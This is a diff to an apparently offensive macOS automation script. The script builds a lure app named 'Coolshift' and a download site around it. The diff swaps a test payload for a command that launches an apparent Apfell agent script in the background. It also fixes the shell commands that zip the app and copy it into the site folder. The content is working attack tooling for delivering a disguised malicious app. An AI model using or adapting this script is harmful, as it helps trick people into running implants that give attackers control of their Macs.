@@ -1,8 +1,9 @@
 //Payload to execute 
 //CHANGE THIS FOR DESIRED PAYLOAD !!!!
 console.log("Make sure to change the variables 'desiredAppName' and 'payload'")
-var desiredAppName = "Watershift"
-var payload = "ps aux > $HOME/Desktop/aqua.txt"
+var desiredAppName = "Coolshift"
+//var payload = "ps aux > $HOME/Desktop/coolbeans.txt"
+var payload = "osascript /Users/Shared/apfell.js &"
 
 /* 
 Example payload
@@ -113,7 +114,7 @@ var newredirect = `${pwd}/${desiredAppName}Site/download.js`
 writeTextToFile(newURLScheme2, newredirect, true)
 
 //Add the zip of the app to site folder
-app.doShellScript("zip -Xr " +pwd+desiredAppName+".zip" + " ./"+desiredAppName+".app/")
-app.doShellScript("cp " +pwd+desiredAppName+".zip" + " "+pwd+desiredAppName+"Site/")
+app.doShellScript("zip -Xr " +pwd+desiredAppName+".zip" + " "+pwd+desiredAppName+".app/")
+app.doShellScript("cp -r " +pwd+desiredAppName+".zip" + " "+pwd+desiredAppName+"Site/")
 
 console.log("Modify the index.html to fit the attack scenario.")
